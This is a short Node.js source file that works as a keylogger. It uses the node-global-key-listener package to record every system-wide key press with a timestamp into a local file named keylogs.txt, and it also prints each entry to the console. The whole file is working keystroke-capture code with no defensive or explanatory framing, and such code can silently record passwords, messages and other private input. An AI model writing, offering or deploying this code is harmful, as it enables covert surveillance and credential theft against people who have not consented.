'use strict';
const fs = require('fs');
const { GlobalKeyboardListener } = require('node-global-key-listener');
const logFile = 'keylogs.txt';

// Initialize the log file in append mode
const logStream = fs.createWriteStream(logFile, { flags: 'a' });

// Create an instance of GlobalKeyboardListener
const keyboard = new GlobalKeyboardListener();

keyboard.addListener(event => {
  if (event.state === 'DOWN') { // Only log key down events
    const logEntry = `${new Date().toISOString()} - ${event.name}\n`;
    logStream.write(logEntry);
    console.log(logEntry); // Also log to the console for debugging
  }
});

// Handle errors
process.on('uncaughtException', err => {
  console.error('An error occurred:', err);
});

